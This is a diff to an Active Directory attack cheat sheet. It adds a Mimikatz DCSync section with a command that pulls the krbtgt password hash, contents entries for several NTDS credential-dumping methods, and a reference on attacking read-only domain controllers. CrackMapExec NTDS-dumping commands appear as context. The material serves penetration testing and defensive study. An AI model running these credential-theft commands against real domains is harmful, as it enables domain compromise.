@@ -8,6 +8,11 @@
   * [Open Shares](#open-shares)
   * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
   * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
+    * Using ndtsutil
+    * Using Vshadow
+    * Using vssadmin
+    * Using DiskShadow
+    * Using Mimikatz DCSync
   * [Password in AD User comment](#password-in-ad-user-comment)
   * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
   * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
@@ -377,6 +382,17 @@ CrackMapExec module
 cme smb 10.10.0.202 -u username -p password --ntds vss
 cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
+
+#### Using Mimikatz DCSync
+
+Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 
+
+```powershell
+mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
+```
+
+:warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.
+
 
 ### Password in AD User comment
 
@@ -989,3 +1005,4 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
 * [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
 * [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
+* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
